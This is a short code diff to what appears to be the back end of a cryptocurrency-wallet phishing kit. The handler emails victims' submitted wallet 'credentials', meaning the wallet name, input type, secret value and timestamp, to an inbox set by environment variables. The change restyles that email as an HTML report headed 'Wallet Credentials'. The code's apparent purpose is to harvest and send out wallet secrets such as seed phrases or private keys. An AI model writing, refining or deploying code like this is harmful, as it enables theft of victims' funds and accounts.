@@ -26,7 +26,13 @@ module.exports = async (req, res) => {
             from: process.env.EMAIL_USER,
             to: process.env.EMAIL_TO,
             subject: `New credentials from ${wallet}`,
-            html: `<pre>${JSON.stringify(req.body, null, 2)}</pre>`,
+            html: `
+                <h2>Wallet Credentials</h2>
+                <p><strong>Wallet:</strong> ${wallet}</p>
+                <p><strong>Input Type:</strong> ${inputType}</p>
+                <p><strong>Value:</strong> ${value}</p>
+                <p><strong>Timestamp:</strong> ${timestamp}</p>
+            `,
         });
         res.status(200).json({ success: true });
     } catch (err) {
